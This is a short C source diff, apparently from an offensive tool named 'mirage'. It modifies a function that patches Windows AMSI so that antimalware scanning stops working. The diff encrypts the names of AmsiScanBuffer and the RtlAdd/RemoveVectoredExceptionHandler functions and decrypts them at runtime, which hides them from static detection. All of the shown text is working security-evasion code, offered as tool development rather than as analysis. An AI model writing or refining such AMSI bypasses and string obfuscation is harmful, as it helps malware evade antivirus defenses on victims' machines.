@@ -145,7 +145,8 @@ int mirage_patch_amsi(void) {
     if (!amsi) return 0;
 
     /* Resolve AmsiScanBuffer */
-    void* scan_buffer = resolve_func(amsi, "AmsiScanBuffer");
+    char amsi_fn[32]; enc_decrypt(enc_AmsiScanBuffer, ENC_AMSISCANBUFFER_LEN, amsi_fn);
+    void* scan_buffer = resolve_func(amsi, amsi_fn);
     if (!scan_buffer) return 0;
 
     /* Resolve RtlAddVectoredExceptionHandler from ntdll */
@@ -154,11 +155,11 @@ int mirage_patch_amsi(void) {
         mirage_encrypted_hash_module(ntdll_name));
     if (!ntdll) return 0;
 
+    char veh_add[64]; enc_decrypt(enc_RtlAddVectoredExceptionHandler, ENC_RTLADDVECTOREDEXCEPTIONHANDLER_LEN, veh_add);
     pRtlAddVectoredExceptionHandler fnAddVEH =
-        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll,
-            "RtlAddVectoredExceptionHandler");
-    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll,
-            "RtlRemoveVectoredExceptionHandler");
+        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll, veh_add);
+    char veh_rem[64]; enc_decrypt(enc_RtlRemoveVectoredExceptionHandler, ENC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_LEN, veh_rem);
+    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, veh_rem);
     if (!fnAddVEH || !g_fnRemoveVEH) return 0;
 
     /* Install VEH (first handler = highest priority) */
